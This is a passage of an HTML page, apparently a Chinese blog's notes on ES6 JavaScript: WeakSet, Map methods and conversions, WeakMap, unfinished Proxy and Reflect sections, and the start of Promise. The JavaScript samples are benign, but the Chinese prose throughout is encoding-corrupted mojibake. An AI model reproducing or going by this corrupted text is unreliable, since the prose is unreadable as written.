å®ä¾‹çš„æŒ‡å®šæˆå‘˜ã€‚</li><li>**WeakSet.prototype.has(value)**ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸä¸ªå€¼æ˜¯å¦åœ¨ WeakSet å®ä¾‹ä¹‹ä¸­ã€‚</li></ul><h2 id="3ã€Map"><a href="#3ã€Map" class="headerlink" title="3ã€Map"></a>3ã€Map</h2><h3 id="å«ä¹‰å’ŒåŸºæœ¬ç”¨æ³•"><a href="#å«ä¹‰å’ŒåŸºæœ¬ç”¨æ³•" class="headerlink" title="å«ä¹‰å’ŒåŸºæœ¬ç”¨æ³•"></a>å«ä¹‰å’ŒåŸºæœ¬ç”¨æ³•</h3><p>JavaScript çš„å¯¹è±¡ï¼ˆObjectï¼‰ï¼Œæœ¬è´¨ä¸Šæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼ˆHash ç»“æ„ï¼‰ï¼Œä½†æ˜¯ä¼ ç»Ÿä¸Šåªèƒ½ç”¨å­—ç¬¦ä¸²å½“ä½œé”®ã€‚è¿™ç»™å®ƒçš„ä½¿ç”¨å¸¦æ¥äº†å¾ˆå¤§çš„é™åˆ¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">data[element] = <span class="string">&#x27;metadata&#x27;</span>;</span><br><span class="line">data[<span class="string">&#x27;[object HTMLDivElement]&#x27;</span>] <span class="comment">// &quot;metadata&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç åŸæ„æ˜¯å°†ä¸€ä¸ª DOM èŠ‚ç‚¹ä½œä¸ºå¯¹è±¡<code>data</code>çš„é”®ï¼Œä½†æ˜¯ç”±äºå¯¹è±¡åªæ¥å—å­—ç¬¦ä¸²ä½œä¸ºé”®åï¼Œæ‰€ä»¥<code>element</code>è¢«è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²<code>[object HTMLDivElement]</code>ã€‚</p><p>ES6 æä¾›äº† Map æ•°æ®ç»“æ„ã€‚å®ƒç±»ä¼¼äºå¯¹è±¡ï¼Œä¹Ÿæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œä½†æ˜¯â€œé”®â€çš„èŒƒå›´ä¸é™äºå­—ç¬¦ä¸²ï¼Œå„ç§ç±»å‹çš„å€¼ï¼ˆåŒ…æ‹¬å¯¹è±¡ï¼‰éƒ½å¯ä»¥å½“ä½œé”®ã€‚</p><p>Map çš„é”®å®é™…ä¸Šæ˜¯è·Ÿå†…å­˜åœ°å€ç»‘å®šçš„ï¼Œåªè¦å†…å­˜åœ°å€ä¸ä¸€æ ·ï¼Œå°±è§†ä¸ºä¸¤ä¸ªé”®ã€‚è¿™å°±è§£å†³äº†åŒåå±æ€§ç¢°æ’ï¼ˆclashï¼‰çš„é—®é¢˜ã€‚</p><h3 id="å®ä¾‹çš„å±æ€§å’Œæ“ä½œæ–¹æ³•"><a href="#å®ä¾‹çš„å±æ€§å’Œæ“ä½œæ–¹æ³•" class="headerlink" title="å®ä¾‹çš„å±æ€§å’Œæ“ä½œæ–¹æ³•"></a>å®ä¾‹çš„å±æ€§å’Œæ“ä½œæ–¹æ³•</h3><p><strong>ï¼ˆ1ï¼‰size å±æ€§</strong></p><p><code>size</code>å±æ€§è¿”å› Map ç»“æ„çš„æˆå‘˜æ€»æ•°ã€‚</p><p><strong>ï¼ˆ2ï¼‰Map.prototype.set(key, value)</strong></p><p><code>set</code>æ–¹æ³•è®¾ç½®é”®å<code>key</code>å¯¹åº”çš„é”®å€¼ä¸º<code>value</code>ï¼Œç„¶åè¿”å›æ•´ä¸ª Map ç»“æ„ã€‚å¦‚æœ<code>key</code>å·²ç»æœ‰å€¼ï¼Œåˆ™é”®å€¼ä¼šè¢«æ›´æ–°ï¼Œå¦åˆ™å°±æ–°ç”Ÿæˆè¯¥é”®ã€‚<code>set</code>æ–¹æ³•è¿”å›çš„æ˜¯å½“å‰çš„<code>Map</code>å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  .set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">  .set(<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>set</code>æ–¹æ³•è¿”å›çš„æ˜¯å½“å‰çš„<code>Map</code>å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  .set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">  .set(<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰Map.prototype.get(key)</strong></p><p><code>get</code>æ–¹æ³•è¯»å–<code>key</code>å¯¹åº”çš„é”®å€¼ï¼Œå¦‚æœæ‰¾ä¸åˆ°<code>key</code>ï¼Œè¿”å›<code>undefined</code>ã€‚</p><p><strong>ï¼ˆ4ï¼‰Map.prototype.has(key)</strong></p><p><code>has</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸä¸ªé”®æ˜¯å¦åœ¨å½“å‰ Map å¯¹è±¡ä¹‹ä¸­ã€‚</p><p><strong>ï¼ˆ5ï¼‰Map.prototype.delete(key)</strong></p><p><code>delete</code>æ–¹æ³•åˆ é™¤æŸä¸ªé”®ï¼Œè¿”å›<code>true</code>ã€‚å¦‚æœåˆ é™¤å¤±è´¥ï¼Œè¿”å›<code>false</code>ã€‚</p><p><strong>ï¼ˆ6ï¼‰Map.prototype.clear()</strong></p><p><code>clear</code>æ–¹æ³•æ¸…é™¤æ‰€æœ‰æˆå‘˜ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</p><h3 id="éå†æ–¹æ³•"><a href="#éå†æ–¹æ³•" class="headerlink" title="éå†æ–¹æ³•"></a>éå†æ–¹æ³•</h3><p>Map ç»“æ„åŸç”Ÿæä¾›ä¸‰ä¸ªéå†å™¨ç”Ÿæˆå‡½æ•°å’Œä¸€ä¸ªéå†æ–¹æ³•ã€‚</p><ul><li><code>Map.prototype.keys()</code>ï¼šè¿”å›é”®åçš„éå†å™¨ã€‚</li><li><code>Map.prototype.values()</code>ï¼šè¿”å›é”®å€¼çš„éå†å™¨ã€‚</li><li><code>Map.prototype.entries()</code>ï¼šè¿”å›æ‰€æœ‰æˆå‘˜çš„éå†å™¨ã€‚</li><li><code>Map.prototype.forEach()</code>ï¼šéå† Map çš„æ‰€æœ‰æˆå‘˜ã€‚</li></ul><h3 id="ä¸å…¶ä»–æ•°æ®ç»“æ„çš„äº’ç›¸è½¬æ¢"><a href="#ä¸å…¶ä»–æ•°æ®ç»“æ„çš„äº’ç›¸è½¬æ¢" class="headerlink" title="ä¸å…¶ä»–æ•°æ®ç»“æ„çš„äº’ç›¸è½¬æ¢"></a>ä¸å…¶ä»–æ•°æ®ç»“æ„çš„äº’ç›¸è½¬æ¢</h3><p><strong>ï¼ˆ1ï¼‰Map è½¬ä¸ºæ•°ç»„</strong></p><p>å‰é¢å·²ç»æè¿‡ï¼ŒMap è½¬ä¸ºæ•°ç»„æœ€æ–¹ä¾¿çš„æ–¹æ³•ï¼Œå°±æ˜¯ä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦ï¼ˆ<code>...</code>ï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myMap = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="literal">true</span>, <span class="number">7</span>)</span><br><span class="line">  .set(&#123;<span class="attr">foo</span>: <span class="number">3</span>&#125;, [<span class="string">&#x27;abc&#x27;</span>]);</span><br><span class="line">[...myMap]</span><br><span class="line"><span class="comment">// [ [ true, 7 ], [ &#123; foo: 3 &#125;, [ &#x27;abc&#x27; ] ] ]</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰æ•°ç»„ è½¬ä¸º Map</strong></p><p>å°†æ•°ç»„ä¼ å…¥ Map æ„é€ å‡½æ•°ï¼Œå°±å¯ä»¥è½¬ä¸º Mapã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="literal">true</span>, <span class="number">7</span>],</span><br><span class="line">  [&#123;<span class="attr">foo</span>: <span class="number">3</span>&#125;, [<span class="string">&#x27;abc&#x27;</span>]]</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰Map è½¬ä¸ºå¯¹è±¡</strong></p><p>å¦‚æœæ‰€æœ‰ Map çš„é”®éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå¯ä»¥æ— æŸåœ°è½¬ä¸ºå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strMapToObj</span>(<span class="params">strMap</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> [k,v] <span class="keyword">of</span> strMap) &#123;</span><br><span class="line">    obj[k] = v;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰å¯¹è±¡è½¬ä¸º Map</strong></p><p>å¯¹è±¡è½¬ä¸º Map å¯ä»¥é€šè¿‡<code>Object.entries()</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj));</span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ–è€…è‡ªå·±å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objToStrMap</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> strMap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</span><br><span class="line">    strMap.set(k, obj[k]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> strMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰Map è½¬ä¸º JSON</strong></p><p>Map è½¬ä¸º JSON è¦åŒºåˆ†ä¸¤ç§æƒ…å†µã€‚ä¸€ç§æƒ…å†µæ˜¯ï¼ŒMap çš„é”®åéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™æ—¶å¯ä»¥é€‰æ‹©è½¬ä¸ºå¯¹è±¡ JSONã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strMapToJson</span>(<span class="params">strMap</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(strMapToObj(strMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æƒ…å†µæ˜¯ï¼ŒMap çš„é”®åæœ‰éå­—ç¬¦ä¸²ï¼Œè¿™æ—¶å¯ä»¥é€‰æ‹©è½¬ä¸ºæ•°ç»„ JSONã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapToArrayJson</span>(<span class="params">map</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify([...map]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ6ï¼‰JSON è½¬ä¸º Map</strong></p><p>JSON è½¬ä¸º Mapï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œæ‰€æœ‰é”®åéƒ½æ˜¯å­—ç¬¦ä¸²ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonToStrMap</span>(<span class="params">jsonStr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> objToStrMap(<span class="built_in">JSON</span>.parse(jsonStr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œæœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œæ•´ä¸ª JSON å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ¯ä¸ªæ•°ç»„æˆå‘˜æœ¬èº«ï¼Œåˆæ˜¯ä¸€ä¸ªæœ‰ä¸¤ä¸ªæˆå‘˜çš„æ•°ç»„ã€‚è¿™æ—¶ï¼Œå®ƒå¯ä»¥ä¸€ä¸€å¯¹åº”åœ°è½¬ä¸º Mapã€‚è¿™å¾€å¾€æ˜¯ Map è½¬ä¸ºæ•°ç»„ JSON çš„é€†æ“ä½œã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonToMap</span>(<span class="params">jsonStr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">JSON</span>.parse(jsonStr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4ã€WeakMap"><a href="#4ã€WeakMap" class="headerlink" title="4ã€WeakMap"></a>4ã€WeakMap</h2><h3 id="å«ä¹‰-2"><a href="#å«ä¹‰-2" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h3><p><code>WeakMap</code>ä¸<code>Map</code>çš„åŒºåˆ«æœ‰ä¸¤ç‚¹ã€‚</p><ul><li>é¦–å…ˆï¼Œ<code>WeakMap</code>åªæ¥å—å¯¹è±¡ä½œä¸ºé”®åï¼ˆ<code>null</code>é™¤å¤–ï¼‰ï¼Œä¸æ¥å—å…¶ä»–ç±»å‹çš„å€¼ä½œä¸ºé”®åã€‚</li><li>å…¶æ¬¡ï¼Œ<code>WeakMap</code>çš„é”®åæ‰€æŒ‡å‘çš„å¯¹è±¡ï¼Œä¸è®¡å…¥åƒåœ¾å›æ”¶æœºåˆ¶ã€‚</li></ul><p><code>WeakMap</code>çš„è®¾è®¡ç›®çš„åœ¨äºï¼Œæœ‰æ—¶æˆ‘ä»¬æƒ³åœ¨æŸä¸ªå¯¹è±¡ä¸Šé¢å­˜æ”¾ä¸€äº›æ•°æ®ï¼Œä½†æ˜¯è¿™ä¼šå½¢æˆå¯¹äºè¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> e1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> e2 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  [e1, <span class="string">&#x27;foo å…ƒç´ &#x27;</span>],</span><br><span class="line">  [e2, <span class="string">&#x27;bar å…ƒç´ &#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸éœ€è¦ e1 å’Œ e2 çš„æ—¶å€™ å¿…é¡»æ‰‹åŠ¨åˆ é™¤å¼•ç”¨</span></span><br><span class="line">arr [<span class="number">0</span>] = <span class="literal">null</span>;</span><br><span class="line">arr [<span class="number">1</span>] = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>e1</code>å’Œ<code>e2</code>æ˜¯ä¸¤ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬é€šè¿‡<code>arr</code>æ•°ç»„å¯¹è¿™ä¸¤ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›æ–‡å­—è¯´æ˜ã€‚è¿™å°±å½¢æˆäº†<code>arr</code>å¯¹<code>e1</code>å’Œ<code>e2</code>çš„å¼•ç”¨ã€‚ä¸€æ—¦ä¸å†éœ€è¦è¿™ä¸¤ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å°±å¿…é¡»æ‰‹åŠ¨åˆ é™¤è¿™ä¸ªå¼•ç”¨ï¼Œå¦åˆ™åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šé‡Šæ”¾<code>e1</code>å’Œ<code>e2</code>å ç”¨çš„å†…å­˜ã€‚</p><p>WeakMap å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œè¯ç”Ÿçš„ï¼Œå®ƒçš„é”®åæ‰€å¼•ç”¨çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ä¸å°†è¯¥å¼•ç”¨è€ƒè™‘åœ¨å†…ã€‚å³ä¸€æ—¦ä¸å†éœ€è¦ï¼ŒWeakMap é‡Œé¢çš„é”®åå¯¹è±¡å’Œæ‰€å¯¹åº”çš„é”®å€¼å¯¹ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œä¸ç”¨æ‰‹åŠ¨åˆ é™¤å¼•ç”¨ã€‚</p><p>ä¸€ä¸ªå…¸å‹åº”ç”¨åœºæ™¯æ˜¯ï¼Œåœ¨ç½‘é¡µçš„ DOM å…ƒç´ ä¸Šæ·»åŠ æ•°æ®ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>WeakMap</code>ç»“æ„ã€‚å½“è¯¥ DOM å…ƒç´ è¢«æ¸…é™¤ï¼Œå…¶æ‰€å¯¹åº”çš„<code>WeakMap</code>è®°å½•å°±ä¼šè‡ªåŠ¨è¢«ç§»é™¤ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wm = <span class="keyword">new</span> <span class="built_in">WeakMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line"></span><br><span class="line">wm.set(element, <span class="string">&#x27;some information&#x27;</span>);</span><br><span class="line">wm.get(element) <span class="comment">// &quot;some information&quot;</span></span><br></pre></td></tr></table></figure><h3 id="WeakMap-çš„è¯­æ³•"><a href="#WeakMap-çš„è¯­æ³•" class="headerlink" title="WeakMap çš„è¯­æ³•"></a>WeakMap çš„è¯­æ³•</h3><p>WeakMap ä¸ Map åœ¨ API ä¸Šçš„åŒºåˆ«ä¸»è¦æ˜¯ä¸¤ä¸ªï¼Œä¸€æ˜¯æ²¡æœ‰éå†æ“ä½œï¼ˆå³æ²¡æœ‰<code>keys()</code>ã€<code>values()</code>å’Œ<code>entries()</code>æ–¹æ³•ï¼‰ï¼Œä¹Ÿæ²¡æœ‰<code>size</code>å±æ€§ã€‚äºŒæ˜¯æ— æ³•æ¸…ç©ºï¼Œå³ä¸æ”¯æŒ<code>clear</code>æ–¹æ³•ã€‚å› æ­¤ï¼Œ<code>WeakMap</code>åªæœ‰å››ä¸ªæ–¹æ³•å¯ç”¨ï¼š<code>get()</code>ã€<code>set()</code>ã€<code>has()</code>ã€<code>delete()</code>ã€‚</p><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><h2 id="1ã€æ¦‚è¿°-1"><a href="#1ã€æ¦‚è¿°-1" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h2><p>Proxy ç”¨äºä¿®æ”¹æŸäº›æ“ä½œçš„é»˜è®¤è¡Œä¸ºï¼Œç­‰åŒäºåœ¨è¯­è¨€å±‚é¢åšå‡ºä¿®æ”¹ï¼Œæ‰€ä»¥å±äºä¸€ç§â€œå…ƒç¼–ç¨‹â€ï¼Œå³å¯¹ç¼–ç¨‹è¯­è¨€è¿›è¡Œç¼–ç¨‹ã€‚</p><p>Proxy å¯ä»¥ç†è§£æˆï¼Œåœ¨ç›®æ ‡å¯¹è±¡ä¹‹å‰æ¶è®¾ä¸€å±‚â€œæ‹¦æˆªâ€ï¼Œå¤–ç•Œå¯¹è¯¥å¯¹è±¡çš„è®¿é—®ï¼Œéƒ½å¿…é¡»å…ˆé€šè¿‡è¿™å±‚æ‹¦æˆªï¼Œå› æ­¤æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥å¯¹å¤–ç•Œçš„è®¿é—®è¿›è¡Œè¿‡æ»¤å’Œæ”¹å†™ã€‚Proxy è¿™ä¸ªè¯çš„åŸæ„æ˜¯ä»£ç†ï¼Œç”¨åœ¨è¿™é‡Œè¡¨ç¤ºç”±å®ƒæ¥â€œä»£ç†â€æŸäº›æ“ä½œï¼Œå¯ä»¥è¯‘ä¸ºâ€œä»£ç†å™¨â€ã€‚</p><p>â€¦(todo)</p><h1 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h1><h2 id="1ã€æ¦‚è¿°-2"><a href="#1ã€æ¦‚è¿°-2" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h2><p><code>Reflect</code>å¯¹è±¡çš„è®¾è®¡ç›®çš„æœ‰è¿™æ ·å‡ ä¸ªã€‚</p><p>ï¼ˆ1ï¼‰ å°†<code>Object</code>å¯¹è±¡çš„ä¸€äº›æ˜æ˜¾å±äºè¯­è¨€å†…éƒ¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚<code>Object.defineProperty</code>ï¼‰ï¼Œæ”¾åˆ°<code>Reflect</code>å¯¹è±¡ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»<code>Reflect</code>å¯¹è±¡ä¸Šå¯ä»¥æ‹¿åˆ°è¯­è¨€å†…éƒ¨çš„æ–¹æ³•ã€‚</p><p>ï¼ˆ2ï¼‰ ä¿®æ”¹æŸäº›<code>Object</code>æ–¹æ³•çš„è¿”å›ç»“æœï¼Œè®©å…¶å˜å¾—æ›´åˆç†ã€‚æ¯”å¦‚ï¼Œ<code>Object.defineProperty(obj, name, desc)</code>åœ¨æ— æ³•å®šä¹‰å±æ€§æ—¶ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè€Œ<code>Reflect.defineProperty(obj, name, desc)</code>åˆ™ä¼šè¿”å›<code>false</code>ã€‚</p><p>ï¼ˆ3ï¼‰ è®©<code>Object</code>æ“ä½œéƒ½å˜æˆå‡½æ•°è¡Œä¸ºã€‚æŸäº›<code>Object</code>æ“ä½œæ˜¯å‘½ä»¤å¼ï¼Œæ¯”å¦‚<code>name in obj</code>å’Œ<code>delete obj[name]</code>ï¼Œè€Œ<code>Reflect.has(obj, name)</code>å’Œ<code>Reflect.deleteProperty(obj, name)</code>è®©å®ƒä»¬å˜æˆäº†å‡½æ•°è¡Œä¸ºã€‚</p><p>ï¼ˆ4ï¼‰<code>Reflect</code>å¯¹è±¡çš„æ–¹æ³•ä¸<code>Proxy</code>å¯¹è±¡çš„æ–¹æ³•ä¸€ä¸€å¯¹åº”ï¼Œåªè¦æ˜¯<code>Proxy</code>å¯¹è±¡çš„æ–¹æ³•ï¼Œå°±èƒ½åœ¨<code>Reflect</code>å¯¹è±¡ä¸Šæ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•ã€‚è¿™å°±è®©<code>Proxy</code>å¯¹è±¡å¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨å¯¹åº”çš„<code>Reflect</code>æ–¹æ³•ï¼Œå®Œæˆé»˜è®¤è¡Œä¸ºï¼Œä½œä¸ºä¿®æ”¹è¡Œä¸ºçš„åŸºç¡€ã€‚</p><p>â€¦(todo)</p><h1 id="Promise-å¯¹è±¡"><a href="#Promise-å¯¹è±¡" class="headerlink" title="Promise å¯¹è±¡"></a>Promise å¯¹è±¡</h1><h2 id="1ã€Promise-çš„å«ä¹‰"><a href="#1ã€Promise-çš„å«ä¹‰" class="headerlink" title="1ã€Promise çš„å«ä¹‰"></a>1ã€Promise çš„å«ä¹‰</h2><p>æ‰€è°“<code>Promise</code>ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œé‡Œé¢ä¿å­˜ç€æŸä¸ªæœªæ¥æ‰ä¼šç»“æŸçš„äº‹ä»¶ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼‰çš„ç»“æœã€‚ä»è¯­æ³•ä¸Šè¯´ï¼ŒPromise æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä»å®ƒå¯ä»¥è·å–å¼‚æ­¥æ“ä½œçš„æ¶ˆæ¯ã€‚</p><p><code>Promise</code>å¯¹è±¡æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰¹ç‚¹ã€‚</p><p>ï¼ˆ1ï¼‰å¯¹è±¡çš„çŠ¶æ€ä¸å—å¤–ç•Œå½±å“ã€‚<code>Promise</code>å¯¹è±¡ä»£è¡¨ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œæœ‰ä¸‰ç§çŠ¶æ€ï¼š<code>pending</code>ï¼ˆè¿›è¡Œä¸­ï¼‰ã€<code>fulfilled</code>ï¼ˆå·²æˆåŠŸï¼‰å’Œ<code>rejected</code>ï¼ˆå·²å¤±è´¥ï¼‰ã€‚åªæœ‰å¼‚æ­¥æ“ä½œçš„ç»“æœï¼Œå¯ä»¥å†³å®šå½“å‰æ˜¯å“ªä¸€ç§çŠ¶æ€ï¼Œä»»ä½•å…¶ä»–æ“ä½œéƒ½æ— æ³•æ”¹å˜è¿™ä¸ªçŠ¶æ€ã€‚</p><p>ï¼ˆ2ï¼‰ä¸€æ—¦çŠ¶æ€æ”¹å˜ï¼Œå°±ä¸ä¼šå†å˜ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“æœã€‚<code>Promise</code>å¯¹è±¡çš„çŠ¶æ€æ”¹å˜ï¼Œåªæœ‰ä¸¤ç§å¯èƒ½ï¼šä»<code>pending</code>å˜ä¸º<code>fulfilled</code>å’Œä»<code>pending</code>å˜ä¸º<code>rejected</code>ã€‚åªè¦è¿™ä¸¤ç§æƒ…å†µå‘ç”Ÿï¼ŒçŠ¶æ€å°±å‡å›ºäº†ï¼Œä¸ä¼šå†å˜äº†ï¼Œä¼šä¸€ç›´ä¿æŒè¿™ä¸ªç»“æœï¼Œè¿™æ—¶å°±ç§°ä¸º resolvedï¼ˆå·²å®šå‹ï¼‰ã€‚å¦‚æœæ”¹å˜å·²ç»å‘ç”Ÿäº†ï¼Œä½ å†å¯¹<code>Promise</code>å¯¹è±¡æ·»åŠ å›è°ƒå‡½æ•°ï¼Œä¹Ÿä¼šç«‹å³å¾—åˆ°è¿™ä¸ªç»“æœã€‚è¿™ä¸äº‹ä»¶ï¼ˆEventï¼‰å®Œå…¨ä¸åŒï¼Œäº‹ä»¶çš„ç‰¹ç‚¹æ˜¯ï¼Œå¦‚æœä½ é”™è¿‡äº†å®ƒï¼Œå†å»ç›‘å¬ï¼Œæ˜¯å¾—ä¸åˆ°ç»“æœçš„ã€‚</p><p>æœ‰äº†<code>Promise</code>å¯¹è±¡ï¼Œå°±å¯ä»¥å°†å¼‚æ­¥æ“ä½œä»¥åŒæ­¥æ“ä½œçš„æµç¨‹è¡¨è¾¾å‡ºæ¥ï¼Œé¿å…äº†å±‚å±‚åµŒå¥—çš„å›è°ƒå‡½æ•°ã€‚</p><p><code>Promise</code>ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ã€‚é¦–å…ˆï¼Œæ— æ³•å–æ¶ˆ<code>Promise</code>ï¼Œä¸€æ—¦æ–°å»ºå®ƒå°±ä¼šç«‹å³æ‰§è¡Œï¼Œæ— æ³•ä¸­é€”å–æ¶ˆã€‚å…¶æ¬¡ï¼Œå¦‚æœä¸è®¾ç½®å›è°ƒå‡½æ•°ï¼Œ<code>Promise</code>å†…éƒ¨æŠ›å‡ºçš„é”™è¯¯ï¼Œä¸ä¼šååº”åˆ°å¤–éƒ¨ã€‚ç¬¬ä¸‰ï¼Œå½“å¤„äº<code>pending</code>çŠ¶æ€æ—¶ï¼Œæ— æ³•å¾—çŸ¥ç›®å‰è¿›å±•åˆ°å“ªä¸€ä¸ªé˜¶æ®µï¼ˆåˆšåˆšå¼€å§‹è¿˜æ˜¯å³å°†å®Œæˆï¼‰ã€‚</p><h2 id="2ã€åŸºæœ¬ç”¨æ³•"><a href="#2ã€åŸºæœ¬ç”¨æ³•" class="headerlink" 